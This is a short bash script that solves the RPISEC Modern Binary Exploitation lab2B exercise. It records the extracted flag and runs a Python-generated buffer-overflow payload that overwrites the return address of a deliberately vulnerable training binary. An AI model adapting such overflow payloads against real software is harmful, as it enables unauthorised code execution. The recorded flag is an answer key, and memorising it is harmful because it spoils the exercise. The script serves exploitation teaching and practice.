#!/usr/bin/env bash
# Reference: https://groheresearch.blogspot.com/2017/06/rpisec-modern-binary-exploitation-lab-2.html
# FLAG EXTRACTED: i_c4ll_wh4t_i_w4nt_n00b

/levels/lab02/lab2B $(python -c 'print("A"*27+"\xbd\x86\x04\x08"+"X"*4+"\xd0\x87\x04\x08")')
